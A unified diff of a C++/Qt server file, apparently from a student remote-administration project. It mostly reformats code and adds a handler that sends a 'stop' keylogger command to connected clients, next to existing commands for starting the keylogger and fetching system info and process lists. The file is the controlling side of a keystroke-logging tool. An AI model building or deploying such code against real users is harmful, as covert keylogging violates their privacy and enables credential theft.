@@ -1,5 +1,5 @@
 #include "ServerApp.hpp"
-#include <QDebug> 
+#include <QDebug>
 
 ServerApp::ServerApp(const std::string &envFilePath)
     : m_envFilePath(envFilePath)
@@ -35,30 +35,35 @@ void ServerApp::run()
         FD_SET(listenFd, &readfds);
         int maxFd = listenFd;
 
-        for (const auto &c : m_clients) {
+        for (const auto &c : m_clients)
+        {
             int fd = c->getSocketFd();
             FD_SET(fd, &readfds);
-            if (fd > maxFd) maxFd = fd;
+            if (fd > maxFd)
+                maxFd = fd;
         }
 
         int activity = select(maxFd + 1, &readfds, nullptr, nullptr, nullptr);
-        if (activity < 0) {
+        if (activity < 0)
+        {
             std::cerr << "select() error: " << std::strerror(errno) << "\n";
             break;
         }
 
-        if (FD_ISSET(listenFd, &readfds)) {
+        if (FD_ISSET(listenFd, &readfds))
+        {
             auto newCl = m_serverSocket.acceptSocket();
             std::cout << "Client connecté: " << newCl->getClientIP() << " (awaiting user info)\n";
             m_clients.push_back(std::move(newCl));
             m_clientUsers.emplace_back();
         }
 
-        for (size_t idx = 0; idx < m_clients.size(); )
+        for (size_t idx = 0; idx < m_clients.size();)
         {
             auto &client = m_clients[idx];
             int fd = client->getSocketFd();
-            if (!FD_ISSET(fd, &readfds)) {
+            if (!FD_ISSET(fd, &readfds))
+            {
                 ++idx;
                 continue;
             }
@@ -74,10 +79,12 @@ void ServerApp::run()
                     const std::string key = "\"username\":\"";
                     std::string username;
                     auto pos = payload.find(key);
-                    if (pos != std::string::npos) {
+                    if (pos != std::string::npos)
+                    {
                         pos += key.size();
                         auto end = payload.find('"', pos);
-                        if (end != std::string::npos) {
+                        if (end != std::string::npos)
+                        {
                             username = payload.substr(pos, end - pos);
                         }
                     }
@@ -99,8 +106,7 @@ void ServerApp::run()
 
                     emit clientResponse(
                         QString::fromStdString(clientInfo),
-                        QString::fromStdString(msg)
-                    );
+                        QString::fromStdString(msg));
 
                     // optionnel ack
                     std::string resp = "ACK: " + msg;
@@ -109,8 +115,7 @@ void ServerApp::run()
                         1,
                         PacketType::RESPONSE,
                         0, 0, 0,
-                        pay
-                    );
+                        pay);
                     client->sendBinary(ack.serialize());
                 }
 
@@ -127,45 +132,74 @@ void ServerApp::run()
     }
 }
 
-void ServerApp::onGetInfoSys(const QString& clientId)
+void ServerApp::onGetInfoSys(const QString &clientId)
 {
     uint32_t sessionId = 0;
     LPTF_Packet packet(1, PacketType::GET_INFO, 0, 0, sessionId, {});
     auto raw = packet.serialize();
-    QByteArray qraw(reinterpret_cast<const char*>(raw.data()), int(raw.size()));
+    QByteArray qraw(reinterpret_cast<const char *>(raw.data()), int(raw.size()));
     sendToClientInternal(clientId, qraw);
 }
 
-void ServerApp::onStartKeylogger(const QString& clientId)
+void ServerApp::onStartKeylogger(const QString &clientId)
 {
     qDebug() << "[ServerApp] onStartKeylogger for" << clientId;
 
- // Prepare the "start" command as payload
-const std::string cmdStart = "start";
-const std::vector<uint8_t> startPayload(cmdStart.begin(), cmdStart.end());
+    // Prepare the "start" command as payload
+    const std::string cmdStart = "start";
+    const std::vector<uint8_t> startPayload(cmdStart.begin(), cmdStart.end());
 
-// Use appropriate packetId and sessionId if you track them per client/session we match what was sent in menu.cpp
-const uint32_t packetId = 1;    // or increment if needed
-const uint32_t sessionId = 0;   // or your actual sessionId
+    // Use appropriate packetId and sessionId if you track them per client/session we match what was sent in menu.cpp
+    const uint32_t packetId = 1;  // or increment if needed
+    const uint32_t sessionId = 0; // or your actual sessionId
 
-LPTF_Packet packet(
-    1,                         // version
-    PacketType::KEYLOG,        // type
-    0,                         // flags
-    packetId,                  // packetId (match terminal or logic)
-    sessionId,                 // sessionId (match terminal or logic)
-    startPayload               // payload: "start"
-);
+    LPTF_Packet packet(
+        1,                  // version
+        PacketType::KEYLOG, // type
+        0,                  // flags
+        packetId,           // packetId (match terminal or logic)
+        sessionId,          // sessionId (match terminal or logic)
+        startPayload        // payload: "start"
+    );
 
-const auto raw = packet.serialize();
-const QByteArray qraw(reinterpret_cast<const char*>(raw.data()), int(raw.size()));
+    const auto raw = packet.serialize();
+    const QByteArray qraw(reinterpret_cast<const char *>(raw.data()), int(raw.size()));
 
-sendToClientInternal(clientId, qraw);
+    sendToClientInternal(clientId, qraw);
 
-qDebug() << "[ServerApp] Keylogger started for" << clientId;
+    qDebug() << "[ServerApp] Keylogger started for" << clientId;
 }
 
-void ServerApp::onRequestProcessList(const QString& clientId, bool namesOnly)
+void ServerApp::onStopKeylogger(const QString &clientId)
+{
+    qDebug() << "[ServerApp] onStopKeylogger for" << clientId;
+
+    // Prepare the "stop" command as payload
+    const std::string cmdStop = "stop";
+    const std::vector<uint8_t> stopPayload(cmdStop.begin(), cmdStop.end());
+
+    // Use appropriate packetId and sessionId if you track them per client/session we match what was sent in menu.cpp
+    const uint32_t packetId = 1;  // or increment if needed
+    const uint32_t sessionId = 0; // or your actual sessionId
+
+    LPTF_Packet packet(
+        1,                  // version
+        PacketType::KEYLOG, // type
+        0,                  // flags
+        packetId,           // packetId (match terminal or logic)
+        sessionId,          // sessionId (match terminal or logic)
+        stopPayload         // payload: "stop"
+    );
+
+    const auto raw = packet.serialize();
+    const QByteArray qraw(reinterpret_cast<const char *>(raw.data()), int(raw.size()));
+
+    sendToClientInternal(clientId, qraw);
+
+    qDebug() << "[ServerApp] Keylogger stopped for" << clientId;
+}
+
+void ServerApp::onRequestProcessList(const QString &clientId, bool namesOnly)
 {
     qDebug() << "[ServerApp] onRequestProcessList for" << clientId << "namesOnly=" << namesOnly;
 
@@ -173,36 +207,37 @@ void ServerApp::onRequestProcessList(const QString& clientId, bool namesOnly)
     uint8_t flags = namesOnly ? 1 : 0;
 
     LPTF_Packet packet(
-        1,                         // version
-        PacketType::PROCESS_LIST,  // type
-        flags,                     // flags
-        0,                         // packetId
-        sessionId,                 // sessionId
-        {}                         // payload vide
+        1,                        // version
+        PacketType::PROCESS_LIST, // type
+        flags,                    // flags
+        0,                        // packetId
+        sessionId,                // sessionId
+        {}                        // payload vide
     );
 
     auto raw = packet.serialize();
-    QByteArray qraw(reinterpret_cast<const char*>(raw.data()), int(raw.size()));
+    QByteArray qraw(reinterpret_cast<const char *>(raw.data()), int(raw.size()));
 
     sendToClientInternal(clientId, qraw);
 }
 
-void ServerApp::sendToClient(const QString& clientInfo, const QByteArray& data)
+void ServerApp::sendToClient(const QString &clientInfo, const QByteArray &data)
 {
     sendToClientInternal(clientInfo, data);
 }
 
-void ServerApp::sendToClientInternal(const QString& clientId, const QByteArray& data)
+void ServerApp::sendToClientInternal(const QString &clientId, const QByteArray &data)
 {
     auto parts = clientId.split(' ');
     const QString ip = (parts.size() >= 2 ? parts.last() : QString());
 
-    for (const auto& sockPtr : m_clients) {
-        if (QString::fromStdString(sockPtr->getClientIP()) == ip) {
+    for (const auto &sockPtr : m_clients)
+    {
+        if (QString::fromStdString(sockPtr->getClientIP()) == ip)
+        {
             std::vector<uint8_t> raw(
-                reinterpret_cast<const uint8_t*>(data.constData()),
-                reinterpret_cast<const uint8_t*>(data.constData()) + data.size()
-            );
+                reinterpret_cast<const uint8_t *>(data.constData()),
+                reinterpret_cast<const uint8_t *>(data.constData()) + data.size());
             sockPtr->sendBinary(raw);
             return;
         }
